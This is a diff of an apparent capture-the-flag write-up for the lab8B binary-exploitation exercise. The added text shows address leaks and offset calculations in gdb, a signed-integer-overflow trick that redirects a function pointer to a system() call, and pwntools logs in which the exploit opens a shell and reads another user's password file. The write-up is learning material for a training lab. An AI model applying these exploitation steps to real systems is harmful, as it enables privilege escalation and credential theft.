@@ -19,7 +19,7 @@ Also, we can't call the printFunc() pointer fromt he favs themselves. Instead, a
 
 
 
-OK, let's start with leaking printf() and printVector() addresses. We'll also calculate the offsets from their neighbors - thisIsASecret() and system().
+OK, let's start with leaking printf() and printVector() addresses. We'll use them later to calculate the offsets from their neighbors - thisIsASecret() and system().
 
 Then we'll examine how the data is aligned in memory.
 
@@ -92,21 +92,7 @@ gdb-peda$ x/100wx 0x80003040
 0x800031b0:     		0x00000000      0x00000000      0x00000000      0x00000000
 0x800031c0:     		0x00000000      0x00000000      0x00000000      0x00000000
 
-The offsets of interest:
 
-gdb-peda$ p thisIsASecret
-$2 = {<text variable, no debug info>} 0x800010a7 <thisIsASecret>
-gdb-peda$ p printVector
-$3 = {<text variable, no debug info>} 0x800010e9 <printVector>
-gdb-peda$ p 0x800010e9-0x800010a7
-$4 = 0x42
-
-gdb-peda$ p printf
-$5 = {<text variable, no debug info>} 0xb7e70280 <__printf>
-gdb-peda$ p system
-$6 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
-gdb-peda$ p 0xb7e70280-0xb7e63190
-$7 = 0xd0f0
 
 Looking at the vuln:
 		memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector)); 
@@ -328,4 +314,117 @@ Yup.
 
 Awesome, we have all the bits and pieces to solve this the basic way (repeat these steps, so the address of thisIsASecret() is used instead of  0x40404044).
 
+So, we have our pointer control via the first integer in the structure (int d). 
+
+It will be sufficient to calculate the thisIsASecret() function's address based on the leaked printFunc()'s address, subtract one from it, then put 0x1 for d in the first vector and thisIsASecret() function's address in the second vector's 'd'. Once summed, will become what we want (we have to do it this way to avoid having 0 in any of our values, as this will prevent the summing from happening).
+
+Let's calculate system() and thisIsASecret() based on their offsets from their neighbors - printf() and printVector(), respectively.
+
+The offsets of interest:
+
+gdb-peda$ p thisIsASecret
+$2 = {<text variable, no debug info>} 0x800010a7 <thisIsASecret>
+gdb-peda$ p printVector
+$3 = {<text variable, no debug info>} 0x800010e9 <printVector>
+gdb-peda$ p 0x800010e9-0x800010a7
+$4 = 0x42
+
+gdb-peda$ p printf
+$5 = {<text variable, no debug info>} 0xb7e70280 <__printf>
+gdb-peda$ p system
+$6 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ p 0xb7e70280-0xb7e63190
+$7 = 0xd0f0
+
+this_is_a_secret_addr = print_vector_addr - 0x42
+
+The approach taken was to put "4" under "d", just like in the first test-data exploit, then put this_is_a_secret_addr-4 to the second vector. 
+For sample printVector() address being 0x800010e9, lead the the following incorrect result:
+
+0x80000003
+
+Knowing that we used 4 in the first vector, I peeked at v2: 
+
+gdb-peda$ x/100wx &v2
+0x80003100 <v2>:        0x800010e9      0x40400040      0x00004040      0x7fffffff <--
+0x80003110 <v2+16>:     0x40404040      0x40404040      0x40404040      0x40404040
+0x80003120 <v2+32>:     0x40404040      0x40404040      0x40404040      0x00000000
+
+Yup, the value being signed caused our first input to create an overflow. Viewed as a signed integer, our target value 0x800010a7 is a negative number.
+
+So, scanf() does not allow us to overflow the integer, but arithmetic operation of + does.
+
+If we overflow any of the "d" fields (v1's or v2's), the value is going to be 0x7fffffff.
+
+If we want any of them to be 0x80000000, we can just use "-1".
+
+Well, that's allright. Knowing this we could either just overflow the int even more, or use a negative value from the very beginning. E.g. make one of the fields 0x80000000 (by just putting "-1" to scanf() input) and then add thisIsASecret()'s fixed offset as the second number.
+
+The offset (RVA) of thisIsASecret() is 0x10a7:
+
+lab8B@warzone:/tmp$ gdb /tmp/lab8B
+Reading symbols from /tmp/lab8B...(no debugging symbols found)...done.
+gdb-peda$ disas thisIsASecret
+Dump of assembler code for function thisIsASecret:
+   0x000010a7 <+0>:     push   ebp
+   0x000010a8 <+1>:     mov    ebp,esp
+   0x000010aa <+3>:     push   ebx
+   0x000010ab <+4>:     sub    esp,0x24
+   0x000010ae <+7>:     call   0x990 <__x86.get_pc_thunk.bx>
+   0x000010b3 <+12>:    add    ebx,0x1ef5
+   0x000010b9 <+18>:    mov    eax,gs:0x14
+   0x000010bf <+24>:    mov    DWORD PTR [ebp-0xc],eax
+   0x000010c2 <+27>:    xor    eax,eax
+   0x000010c4 <+29>:    lea    eax,[ebx-0x1586]
+   0x000010ca <+35>:    mov    DWORD PTR [esp],eax
+   0x000010cd <+38>:    call   0x900 <system@plt>
+   0x000010d2 <+43>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x000010d5 <+46>:    xor    eax,DWORD PTR gs:0x14
+   0x000010dc <+53>:    je     0x10e3 <thisIsASecret+60>
+   0x000010de <+55>:    call   0x1650 <__stack_chk_fail_local>
+   0x000010e3 <+60>:    add    esp,0x24
+   0x000010e6 <+63>:    pop    ebx
+   0x000010e7 <+64>:    pop    ebp
+   0x000010e8 <+65>:    ret
+End of assembler dump.
+
+$ printf "%d" 0x10a7
+4263
+
+I am actually wondering why does this address keep being static in spite of ASLR and PIE compilation flags (and no -static flags, like we had with lab7A). This makes the entire leaking pointless.
+
+Fine, let's just go with "-2147483648" (0x80000000) and "4263" (0x10a7) as v1.d and v2.d, respectively.
+
+    'I COMMAND YOU TO ENTER YOUR COMMAND: '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0xe bytes:
+    'Which vector? '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[*] Switching to interactive mode
+[DEBUG] Received 0x2 bytes:
+    '$ '
+$ $ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x61 bytes:
+    'uid=1030(lab8B) gid=1031(lab8B) euid=1031(lab8A) groups=1032(lab8A),1001(gameuser),1031(lab8B)\n'
+    '$ '
+uid=1030(lab8B) gid=1031(lab8B) euid=1031(lab8A) groups=1032(lab8A),1001(gameuser),1031(lab8B)
+$ $ cat /home/lab8A/.pass
+[DEBUG] Sent 0x16 bytes:
+    'cat /home/lab8A/.pass\n'
+[DEBUG] Received 0x1d bytes:
+    'Th@t_w@5_my_f@v0r1t3_ch@11\n'
+    '$ '
+Th@t_w@5_my_f@v0r1t3_ch@11
+
+Yeah got it ;)
+
+
+
+A note about reliability and elegant solutions:
+This is obviously not an elegant solution, as the exploit would not be reliable in case our target address fit the positive range of the signed int (it won't here, though). We could easily detect this and in such case avoid adding the additional overflow offset to the second vector's "d" field before continuing.
+Ah fuck, we can't. We can only leak the printVector() address after creating the first vector. That's OK, we can overwrite it by entering the vector data once again and then summing once again. And afterwards add the faves and print.
 
